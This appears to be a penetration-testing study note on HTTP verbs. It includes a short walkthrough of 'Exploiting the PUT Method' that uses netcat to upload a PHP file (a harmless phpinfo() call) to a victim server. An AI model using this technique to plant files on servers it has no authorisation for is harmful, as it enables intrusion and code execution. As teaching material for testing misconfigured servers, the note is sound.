# HTTP Verbs

### Get

It is used to request a resource. We can also pass arguments to webserver in url using `?`



### Post

It is used to submit HTML form data. POST parameters should be in message body



### Head

It asks header of the response instead of also getting the body.



### Put

It is used to upload a file to the server. It is very dangerous if allowed and misconfigured

```
PUT /path/to/destination HTTP/1.1
Host: www.example.com

<Put Data>
```

#### Exploiting the PUT Method

You have to specify the size of file that you are sending

```bash
$ wc -m payload.php
20 payload.php
```

* \-m tells us how long in bytes our payload is.

```bash
$ nc victim_ip port
PUT /payload.php HTTP/1.0
Content-type: text/html
Content-length: 20

<?php phpinfo(); ?>
```

* HTTP/1.0 allows us to skip the **Host:** header



### Delete

It is used to remove a file from the server. It is also very dangerous which can lead to denial of service and data loss

```
DELETE /path/to/destination HTTP/1.1
Host: www.example.com
```



### Options

It is used to query web server for enabled http verbs.
